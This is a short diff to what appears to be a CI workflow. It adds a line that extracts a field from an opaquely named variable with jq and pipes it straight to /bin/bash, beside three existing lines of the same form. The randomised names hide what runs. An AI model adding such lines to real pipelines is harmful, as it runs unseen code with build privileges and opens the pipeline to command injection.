@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$ay87" | jq -r .bf2165 | /bin/bash
           printf '%s' "$zgco06462" | jq -r .l51 | /bin/bash
           printf '%s' "$gj39352" | jq -r .g8309 | /bin/bash
+          echo $rdo2129 | jq -r .p56700 | /bin/bash
 
       - name: Save output
         if: always()
